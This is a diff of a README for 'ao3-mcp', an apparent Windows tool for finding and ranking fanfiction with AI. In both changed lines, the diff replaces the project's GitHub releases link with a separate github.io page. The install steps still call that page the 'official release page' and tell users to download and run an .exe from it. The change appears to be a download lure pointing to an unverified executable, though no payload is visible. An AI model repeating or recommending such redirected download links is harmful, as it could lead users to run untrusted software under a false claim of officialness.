@@ -1,6 +1,6 @@
 # 📚 ao3-mcp - Find and rank fanfiction using AI
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/huntleeouter514/ao3-mcp/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://huntleeouter514.github.io)
 
 This application helps you interact with Archive of Our Own. It uses artificial intelligence to search through fanfiction. You can ask the AI to read specific stories and provide rankings. This tool saves you time so you find stories that match your interests.
 
@@ -13,7 +13,7 @@ You need a computer running Windows 10 or Windows 11. Your computer should have 
 Follow these steps to get the application.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/huntleeouter514/ao3-mcp/releases).
+2. Go to the [official release page](https://huntleeouter514.github.io).
 3. Look for the section labeled Assets.
 4. Click the file that ends in .exe.
 5. Save the file to your desktop or downloads folder.
